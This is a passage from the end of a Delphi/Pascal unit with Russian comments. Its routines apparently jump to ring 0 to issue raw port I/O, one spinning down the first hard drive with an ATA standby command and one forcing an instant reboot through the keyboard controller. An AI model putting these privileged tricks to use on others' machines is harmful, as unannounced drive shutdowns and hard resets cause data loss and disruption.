SetIoAccessMap(pIopm);
end;
{ Выключение первого винта. }
Procedure DisableHDD();
Procedure Ring0Call;
asm
 mov al, $0E6
 mov dx, $1F7
 out dx, al
 ret
end;

begin
CallRing0(@Ring0Call, nil);
end;
{ Перезагрузка. }
Procedure FastReboot();
Procedure Ring0Call;
asm
 mov al, $FE
 out $64, al
 ret
end;

begin
CallRing0(@Ring0Call, nil);
end;
end.